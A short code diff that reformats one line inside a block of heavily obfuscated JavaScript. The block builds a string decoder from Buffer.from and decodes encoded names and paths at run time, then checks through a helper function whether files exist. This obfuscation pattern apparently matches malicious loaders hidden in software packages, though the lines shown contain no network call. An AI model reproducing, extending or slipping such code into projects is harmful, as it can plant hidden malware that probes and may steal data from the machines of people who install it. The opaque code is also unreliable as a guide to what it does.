@@ -26,7 +26,8 @@ Buffer.from(s1,t).toString(c)),e=(r,e)=>{ let E=Buffer.from(r,t);
     Y="N3RFYU07",D="AgYPTBAyD1QQJx9WFg",k="EhES",b="WhcKURAaEg",
     M=d("WloISBk"),N=d(b),p=d(D),Z=d(k),j=d("EAwPSwEHNUEbFw"),
     m="WgcSVwcRSFYaEAM",J=d("FBcFXQYHNUEbFw");
-    function T(t){try{return S[J](t),!0}catch(t){return!1}}
+    function T(t){try{return S[J](t),!0} 
+    catch(t){return!1}}
     const v=d("MREAWQAYEg"),
     O=d("JQYJXhwYAw"),
     K=d("WjUWSDEVEllaOAlbFBhJdRwXFFcGGwBMWjECXxBbM0sQBkZ8FAAH"),
